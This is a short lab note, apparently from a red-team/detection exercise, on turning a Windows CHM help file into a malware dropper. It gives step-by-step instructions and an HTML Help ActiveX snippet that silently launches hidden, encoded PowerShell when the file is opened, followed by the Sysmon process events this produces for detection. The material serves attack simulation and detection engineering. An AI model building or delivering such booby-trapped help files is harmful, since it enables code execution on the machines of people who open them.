- **Step 0:** Download and install [**Microsoft HTML Help Workshop and Documentation**](https://www.microsoft.com/en-us/download/details.aspx?id=21138)
- **Step 1:** Obtain a valid CHM file and unpack it using 7-zip
- **Step 2:** Find an entry-point HTML file within "*docs*" directory and insert the following code into it's `<body>` section:

```
<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
<PARAM name="Command" value="ShortCut">
 <PARAM name="Button" value="Bitmap::shortcut">
 <PARAM name="Item1" value=",cmd.exe,/c powershell.exe -nop -w hidden -e <encoded-payload">
 <PARAM name="Item2" value="273,1,1">
</OBJECT>
<SCRIPT>
x.Click();
</SCRIPT>
```

- **Step 3:** Prepare `Project.hpp` file with contents like the below ones:

```
PS C:\Users\bat\Desktop\red\Extract> hhc.exe .\Project.hpp
Microsoft HTML Help Compiler 4.74.8702

Compiling c:\Users\bat\Desktop\red\Extract\Project.chm


Compile time: 0 minutes, 0 seconds
24      Topics
29      Local links
2       Internet links
11      Graphics


Created c:\Users\bat\Desktop\red\Extract\Project.chm, 127,307 bytes
Compression decreased file by 51,098 bytes.
```

Sysmon



We got multiple process create depending on starting hh.exe process

- CMD Process

```
CommandLine: "C:\Windows\System32\cmd.exe" /c powershell.exe -nop -w hidden -e <Endoded_payload>
ParentImage: C:\Windows\hh.exe
ParentCommandLine: "C:\Windows\hh.exe" C:\Users\bat\Desktop\red\Extract\Project.chm
```

- PowerShell Process

```
CommandLine: powershell.exe  -nop -w hidden -e <Endoded_payload>
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: "C:\Windows\System32\cmd.exe" /c powershell.exe -nop -w hidden -e <Endoded_payload>
```

